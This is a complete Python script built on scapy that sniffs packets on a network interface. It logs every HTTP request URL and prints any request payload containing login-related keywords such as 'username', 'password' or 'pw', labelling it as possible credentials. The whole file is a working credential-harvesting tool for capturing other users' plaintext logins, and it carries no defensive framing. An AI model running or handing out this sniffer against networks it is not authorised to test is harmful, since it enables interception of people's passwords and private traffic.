import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request >> {}".format(url))
        credentials = get_credentials(packet)
        if credentials:
            print("\n\n[+] Possible username/password > {}".format(credentials))


def get_url(packet):
    host = packet[http.HTTPRequest].Host.decode("utf-8", errors="ignore")
    path = packet[http.HTTPRequest].Path.decode("utf-8", errors="ignore")
    url = f"http://{host}{path}"
    return url


keywords = [
    "username",
    "user",
    "login",
    "uname",
    "password",
    "pass",
    "signin",
    "signup",
    "uname",
    "pw",
    "usr",
]


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode("utf-8", errors="ignore")
        for keyword in keywords:
            if keyword in field_load:
                return field_load


sniff("Ethernet")
